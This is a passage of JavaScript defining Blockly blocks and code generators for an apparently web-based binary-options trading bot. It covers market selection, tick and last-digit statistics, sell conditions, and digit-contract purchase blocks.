javascript.javascriptGenerator.forBlock["1001lastdigitlist_continuousindices"] = function (c, a) {
  return ["mainDigitArray_continuousindices", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "setactive_continuousindices",
  message0: "Set Active [Multi Market: Continuous Indices] %1 %2 #1. Volatility 10(1s) Index %3 %4 #2. Volatility 25(1s) Index %5 %6 #3. Volatility 50(1s) Index %7 %8 #4. Volatility 75(1s) Index %9 %10 #5. Volatility 100(1s) Index %11 %12 #6. Volatility 10 Index %13 %14 #7. Volatility 25 Index %15 %16 #8. Volatility 50 Index %17 %18 #9. Volatility 75 Index %19 %20 #10. Volatility 100 Index",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market1_nya",
    checked: true
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market2_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market3_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market4_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market5_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market6_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market7_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market8_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market9_nya"
  }, {
    type: "input_end_row"
  }, {
    type: "field_checkbox",
    name: "check_market10_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.setactive_continuousindices = function (d, a) {
  for (var b = 1; b <= 10; b++) {
    Ga[b] = d.getFieldValue("check_market" + b + "_nya") === "TRUE";
  }
  return "for(var m=1;m<=10;m++){if(continuousindices_active[m].checked!=checkbox_check_market_nya[m]){continuousindices_active[m].checked=checkbox_check_market_nya[m];continuousindices_activeChanged(m,checkbox_check_market_nya[m]);}};";
};
Blockly.defineBlocksWithJsonArray([{
  type: "continuousindices",
  message0: "[Multi Market] Continuous Indices: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_continuousindices_A",
    options: [["#1. Volatility 10(1s) Index", "1"], ["#2. Volatility 25(1s) Index", "2"], ["#3. Volatility 50(1s) Index", "3"], ["#4. Volatility 75(1s) Index", "4"], ["#5. Volatility 100(1s) Index", "5"], ["#6. Volatility 10 Index", "6"], ["#7. Volatility 25 Index", "7"], ["#8. Volatility 50 Index", "8"], ["#9. Volatility 75 Index", "9"], ["#10. Volatility 100 Index", "10"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_continuousindices_B",
    options: [["1001 Ticks List", "ticks"], ["1001 Last Digit List", "digits"], ["Symbol", "symbol"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.continuousindices = function (f, a) {
  var b = f.getFieldValue("dropdown_continuousindices_A");
  var c = f.getFieldValue("dropdown_continuousindices_B");
  var d;
  if (c == "symbol") {
    d = "document.getElementById(\"continuousindices_" + b + "_" + c + "\").innerText";
  } else {
    d = "(document.getElementById(\"continuousindices_" + b + "_active\").checked)?document.getElementById(\"continuousindices_" + b + "_" + c + "\").value:\"\"";
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellconditions",
  message0: "%1 3. Sell conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_dollarsack.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_sellconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellconditions = function (e, a) {
  var b = a.statementToCode(e, "statement_sellconditions");
  var c = "func$1$9$8$7$SellConditions=()=>{" + b + "}";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellisavailable",
  message0: "Sell is available",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellisavailable = function (c, a) {
  return ["(isContractValidToSell[sedangPantauContractPos]==1)?true:false", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellprofitloss",
  message0: "Sell profit/loss",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellprofitloss = function (c, a) {
  return ["sellProfitLoss[sedangPantauContractPos]", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "sellatmarket",
  message0: "Sell at market",
  args0: [],
  previousStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.sellatmarket = function (c, a) {
  return "funcSellAtMarket();";
};
Blockly.defineBlocksWithJsonArray([{
  type: "restarttradingconditions",
  message0: "%1 4. Restart trading conditions %2 %3",
  args0: [{
    type: "field_image",
    src: "https://block.ezbinarybot.com/image/icon_finish.png",
    width: 25,
    height: 25,
    alt: "*",
    flipRtl: false
  }, {
    type: "input_end_row"
  }, {
    type: "input_statement",
    name: "statement_restarttradingconditions"
  }],
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.restarttradingconditions = function (e, a) {
  var b = a.statementToCode(e, "statement_restarttradingconditions");
  var c = "func$1$9$8$7$RestartTradingConditions=()=>{" + b + "}";
  return c;
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastcontractdetail",
  message0: "Last contract detail: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_lastcontractdetail_A",
    options: [["Ask price", "askprice"], ["Payout", "payout"], ["Profit", "profit"], ["Contract type", "contracttype"], ["Entry time", "entrytime"], ["Entry value", "entryvalue"], ["Entry value string", "entryvaluestring"], ["Exit time", "exittime"], ["Exit value", "exitvalue"], ["Exit value string", "exitvaluestring"], ["Barrier", "barrier"], ["Result", "result"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastcontractdetail = function (e, a) {
  var b = e.getFieldValue("dropdown_lastcontractdetail_A");
  var c = "lastCont_" + b;
  if (["askprice", "payout", "profit", "entryvalue", "exitvalue"].includes(b)) {
    c += "*1";
  }
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lastdigit",
  message0: "Last Digit",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lastdigit = function (c, a) {
  return ["digitArrayUtama.at(-1)*1", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001lastdigitlist",
  message0: "1001 Last Digit List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001lastdigitlist"] = function (c, a) {
  return ["digitArrayUtama", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10digits",
  message0: "Last 10 digits: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10digits_A",
    options: [["Digit", "digit"], ["Tick move", "tickmove"], ["Change", "change"], ["Digit move", "digitmove"], ["Digit caterzian", "digitgraph"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10digits_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10digits = function (f, a) {
  var b = f.getFieldValue("dropdown_thelast10digits_A");
  var c = f.getFieldValue("dropdown_thelast10digits_B");
  var d;
  if (c == "list") {
    d = "thelast10digits_" + b + "_list";
  } else {
    d = "document.getElementById(\"thelast10digits_" + b + "_" + c + "\").innerText";
    if (["digit", "change", "digitgraph"].includes(b)) {
      d += "*1";
    }
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatisticsetnoofticks",
  message0: "Digit statistic | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatisticsetnoofticks = function (f, a) {
  var b = f.getFieldValue("row_nya");
  var c = a.valueToCode(f, "ticks_nya", javascript.Order.ATOMIC);
  var d = "digitstatistic_noofticks[" + b + "].value=" + c + "*1;";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "digitstatistic",
  message0: "Digit statistic: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_digitstatistic_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"], ["Summary", "summ"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_digitstatistic_B",
    options: [["List", "list"], ["Digit 0", "0"], ["Digit 1", "1"], ["Digit 2", "2"], ["Digit 3", "3"], ["Digit 4", "4"], ["Digit 5", "5"], ["Digit 6", "6"], ["Digit 7", "7"], ["Digit 8", "8"], ["Digit 9", "9"], ["Least", "least"], ["Most", "most"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.digitstatistic = function (f, a) {
  var b = f.getFieldValue("dropdown_digitstatistic_A");
  var c = f.getFieldValue("dropdown_digitstatistic_B");
  var d;
  if (c == "list") {
    if (b == "summ") {
      d = "digitstatistic_list[7]";
    } else {
      d = "digitstatistic_list[" + b + "]";
    }
  } else {
    d = "document.getElementById(\"digitstatistic_" + b + "_" + c + "\").innerText";
    if (["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(c)) {
      d += "*1";
    }
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "caterzian20",
  message0: "Caterzian 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_caterzian20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.caterzian20 = function (e, a) {
  var b = e.getFieldValue("dropdown_caterzian20_B");
  var c;
  if (b == "list") {
    c = "thelast20digits_digitcater_list";
  } else {
    c = "document.getElementById(\"thelast20digits_digitcater_" + b + "\").innerText*1";
  }
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenodd20",
  message0: "Even / odd 20: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenodd20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenodd20 = function (e, a) {
  var b = e.getFieldValue("dropdown_evenodd20_B");
  var c;
  if (b == "list") {
    c = "thelast20digits_digitevenodd_list";
  } else {
    c = "document.getElementById(\"thelast20digits_digitevenodd_" + b + "\").innerText";
  }
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsoddsetnoofticks",
  message0: "Even VS Odd | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsoddsetnoofticks = function (f, a) {
  var b = f.getFieldValue("row_nya");
  var c = a.valueToCode(f, "ticks_nya", javascript.Order.ATOMIC);
  var d = "evenvsodd_noofticks[" + b + "].value=" + c + "*1;";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "evenvsodd",
  message0: "Even VS Odd: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_evenvsodd_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_evenvsodd_B",
    options: [["Even(%)", "even"], ["Odd(%)", "odd"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.evenvsodd = function (f, a) {
  var b = f.getFieldValue("dropdown_evenvsodd_A");
  var c = f.getFieldValue("dropdown_evenvsodd_B");
  var d = "document.getElementById(\"evenvsodd_" + b + "_" + c + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetnoofticks",
  message0: "Over VS Under | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetnoofticks = function (f, a) {
  var b = f.getFieldValue("row_nya");
  var c = a.valueToCode(f, "ticks_nya", javascript.Order.ATOMIC);
  var d = "overvsunder_noofticks[" + b + "].value=" + c + "*1;";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsundersetdigit",
  message0: "Over VS Under | Set %1 %2 %3",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row 1", "1"], ["Row 2", "2"]]
  }, {
    type: "field_dropdown",
    name: "type_nya",
    options: [["Over", "over"], ["Under", "under"]]
  }, {
    type: "input_value",
    name: "digit_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsundersetdigit = function (g, a) {
  var b = g.getFieldValue("row_nya");
  var c = g.getFieldValue("type_nya");
  var d = a.valueToCode(g, "digit_nya", javascript.Order.ATOMIC);
  var e = "document.getElementById(\"overvsunder_" + b + "_" + c + "digit\").value=" + d + ";";
  return e;
};
Blockly.defineBlocksWithJsonArray([{
  type: "overvsunder",
  message0: "Over VS Under: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_overvsunder_A",
    options: [["Row#1", "1"], ["Row#2", "2"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_overvsunder_B",
    options: [["Over(%)", "over"], ["Under(%)", "under"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.overvsunder = function (f, a) {
  var b = f.getFieldValue("dropdown_overvsunder_A");
  var c = f.getFieldValue("dropdown_overvsunder_B");
  var d = "document.getElementById(\"overvsunder_" + b + "_" + c + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttick",
  message0: "Last Tick",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttick = function (c, a) {
  return ["tickArrayUtama.at(-1)*1", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "lasttickstring",
  message0: "Last Tick String",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.lasttickstring = function (c, a) {
  return ["tickArrayUtamaText.at(-1)", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001tickslist",
  message0: "1001 Ticks List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001tickslist"] = function (c, a) {
  return ["tickArrayUtama", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "1001ticksstringlist",
  message0: "1001 Ticks String List",
  args0: [],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock["1001ticksstringlist"] = function (c, a) {
  return ["tickArrayUtamaText", Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "thelast10ticks",
  message0: "Last 10 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_A",
    options: [["Tick", "tick"], ["Move", "move"], ["Worm", "worm"], ["Sentiment", "sentiment"], ["Change", "change"], ["%", "%"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_thelast10ticks_B",
    options: [["List", "list"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.thelast10ticks = function (f, a) {
  var b = f.getFieldValue("dropdown_thelast10ticks_A");
  var c = f.getFieldValue("dropdown_thelast10ticks_B");
  var d;
  if (c == "list") {
    if (b == "%") {
      d = "thelast10ticks_changeperc_list";
    } else {
      d = "thelast10ticks_" + b + "_list";
    }
  } else {
    d = "document.getElementById(\"thelast10ticks_" + b + "_" + c + "\").innerText";
    if (["tick", "change", "%"].includes(b)) {
      d += "*1";
    }
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "tickworm20",
  message0: "Worm 20: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_tickworm20_A",
    options: [["History (worm head)", "history"], ["Current", "current"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_tickworm20_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.tickworm20 = function (f, a) {
  var b = f.getFieldValue("dropdown_tickworm20_A");
  var c = f.getFieldValue("dropdown_tickworm20_B");
  var d;
  if (c == "list") {
    d = "thelast20tickworm_" + b + "_list";
  } else {
    d = "document.getElementById(\"thelast20tickworm_" + b + "_" + c + "\").innerText";
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfallsetnoofticks",
  message0: "Rise VS Fall | Set %1 : %2 ticks",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "input_value",
    name: "ticks_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfallsetnoofticks = function (f, a) {
  var b = f.getFieldValue("row_nya");
  var c = a.valueToCode(f, "ticks_nya", javascript.Order.ATOMIC);
  var d = "risevsfall_noofticks[" + b + "].value=" + c + "*1;";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "risevsfall",
  message0: "Rise VS Fall: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_risevsfall_A",
    options: [["Row#1", "1"], ["Row#2", "2"], ["Row#3", "3"], ["Row#4", "4"], ["Row#5", "5"], ["Row#6", "6"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_risevsfall_B",
    options: [["Rise(%)", "rise"], ["Fall(%)", "fall"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.risevsfall = function (f, a) {
  var b = f.getFieldValue("dropdown_risevsfall_A");
  var c = f.getFieldValue("dropdown_risevsfall_B");
  var d = "document.getElementById(\"risevsfall_" + b + "_" + c + "\").innerText.replaceAll(\"%\",\"\")*1";
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "inpTickTrismasetperiod",
  message0: "Triple SMA ticks | Set period %1 : %2",
  args0: [{
    type: "field_dropdown",
    name: "row_nya",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "input_value",
    name: "period_nya"
  }],
  inputsInline: true,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.inpTickTrismasetperiod = function (f, a) {
  var b = f.getFieldValue("row_nya");
  var c = a.valueToCode(f, "period_nya", javascript.Order.ATOMIC);
  var d = "inpTickTrisma_period[" + b + "].value=" + c + "*1;";
  return d;
};
Blockly.defineBlocksWithJsonArray([{
  type: "ticktrisma",
  message0: "Triple SMA ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_ticktrisma_A",
    options: [["SMA#1", "1"], ["SMA#2", "2"], ["SMA#3", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_ticktrisma_B",
    options: [["List", "list"], ["20th", "20"], ["19th", "19"], ["18th", "18"], ["17th", "17"], ["16th", "16"], ["15th", "15"], ["14th", "14"], ["13th", "13"], ["12th", "12"], ["11th", "11"], ["10th", "10"], ["9th", "9"], ["8th", "8"], ["7th", "7"], ["6th", "6"], ["5th", "5"], ["4th", "4"], ["3rd", "3"], ["2nd", "2"], ["1st", "1"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.ticktrisma = function (f, a) {
  var b = f.getFieldValue("dropdown_ticktrisma_A");
  var c = f.getFieldValue("dropdown_ticktrisma_B");
  var d;
  if (c == "list") {
    d = "tick_sma_list[" + b + "]";
  } else {
    d = "document.getElementById(\"tick_sma" + b + "_" + c + "\").innerText*1";
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "detail3ticks",
  message0: "Detail 3 ticks: %1 %2",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_detail3ticks_A",
    options: [["1st last tick", "1"], ["2nd last tick", "2"], ["3rd last tick", "3"]]
  }, {
    type: "field_dropdown",
    name: "dropdown_detail3ticks_B",
    options: [["1st", "1"], ["2nd", "2"], ["3rd", "3"], ["4th", "4"], ["5th", "5"], ["6th", "6"], ["7th", "7"], ["8th", "8"], ["9th", "9"], ["10th", "10"], ["11th", "11"], ["12th", "12"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.detail3ticks = function (f, a) {
  var b = f.getFieldValue("dropdown_detail3ticks_A");
  var c = f.getFieldValue("dropdown_detail3ticks_B");
  var d = "document.getElementById(\"detail3ticks_" + b + "_" + c + "\").innerText";
  if (!isNaN(document.getElementById("detail3ticks_" + b + "_" + c).innerText)) {
    d += "*1";
  }
  return [d, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "getstataccu",
  message0: "Get Stats ACCUMULATOR %1 Market: %2 %3 Growth Rate % [1-5]: %4 Tick List : %5",
  args0: [{
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: Cd
  }, {
    type: "input_end_row"
  }, {
    type: "input_value",
    name: "growthRate_nya"
  }, {
    type: "input_value",
    name: "arrTick_nya",
    check: "Array"
  }],
  inputsInline: false,
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.getstataccu = function (h, a) {
  var b = h.getFieldValue("market_nya");
  var c = b == "activemarket" ? "mainSymbol" : b == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + b.split("|")[0] + "\"";
  var d = a.valueToCode(h, "growthRate_nya", javascript.Order.ATOMIC);
  var e = a.valueToCode(h, "arrTick_nya", javascript.Order.ATOMIC);
  var f = "getStatAccu(" + e + "," + c + "," + d + ")";
  return [f, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "datetime",
  message0: "Date/Time: %1",
  args0: [{
    type: "field_dropdown",
    name: "dropdown_datetime",
    options: [["Year", "year"], ["Month", "month"], ["Date", "date"], ["Hours", "hours"], ["Minutes", "minutes"], ["Seconds", "seconds"], ["Time Zone", "timezone"], ["Seconds Since Epoch", "secondssinceepoch"]]
  }],
  output: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.datetime = function (e, a) {
  var b = e.getFieldValue("dropdown_datetime");
  var c;
  switch (b) {
    case "year":
      c = "new Date().getFullYear()";
      break;
    case "month":
      c = "(new Date().getMonth())*1+1";
      break;
    case "date":
      c = "new Date().getDate()";
      break;
    case "hours":
      c = "new Date().getHours()";
      break;
    case "minutes":
      c = "new Date().getMinutes()";
      break;
    case "seconds":
      c = "new Date().getSeconds()";
      break;
    case "timezone":
      c = "\"GMT\"+((new Date().getTimezoneOffset())==0 ? \"\" : ((new Date().getTimezoneOffset())<0 ? \"+\" : \"-\")+Math.abs(new Date().getTimezoneOffset()/60))";
      break;
    case "secondssinceepoch":
      c = "Math.floor(new Date().getTime()/1000)";
      break;
  }
  return [c, Blockly.JavaScript.ORDER_NONE];
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_diff_match",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9 Last Digit Prediction: [0-9] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Differs", "DIGITDIFF"], ["Digit Matches", "DIGITMATCH"]]
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "account_nya",
    options: Ad
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "market_nya",
    options: zd
  }, {
    type: "input_end_row"
  }, {
    type: "field_dropdown",
    name: "stakeAM_nya",
    options: Bd
  }, {
    type: "input_value",
    name: "stake_nya"
  }, {
    type: "input_value",
    name: "inpduration_nya"
  }, {
    type: "input_value",
    name: "ldp_nya"
  }],
  inputsInline: false,
  previousStatement: null,
  nextStatement: null,
  colour: "#3e3e3e",
  tooltip: "",
  helpUrl: ""
}]);
javascript.javascriptGenerator.forBlock.purchase_diff_match = function (l, a) {
  var b = l.getFieldValue("selcontract_nya");
  var c = l.getFieldValue("market_nya");
  var d = c == "activemarket" ? "mainSymbol" : c == "mainMarket_continuousindices" ? "mainMarket_continuousindices" : "\"" + c.split("|")[0] + "\"";
  var e = l.getFieldValue("account_nya");
  var f = l.getFieldValue("stakeAM_nya");
  var g = a.valueToCode(l, "stake_nya", javascript.Order.ATOMIC);
  if (g.toString().length == 0) {
    g = 1;
  }
  ;
  var m = a.valueToCode(l, "inpduration_nya", javascript.Order.ATOMIC);
  var i = a.valueToCode(l, "ldp_nya", javascript.Order.ATOMIC);
  var j = "mainPurchase(\"" + e + "\",\"" + f + "\"," + g + ",\"" + b + "\"," + d + "," + m + ",\"t\",0,0,0," + i + ",0,0,0,0,0,0,0,0);";
  return j;
};
Blockly.defineBlocksWithJsonArray([{
  type: "purchase_over_under",
  message0: "Purchase: %1 %2 Account: %3 %4 Market: %5 %6 Stake %7 %8 Duration: ticks [1-10] %9 Last Digit Prediction: [Over:0-8] [Under:1-9] %10",
  args0: [{
    type: "field_dropdown",
    name: "selcontract_nya",
    options: [["Digit Over", "DIGITOVER"], ["Digit Under", "DIGITUNDER"]]
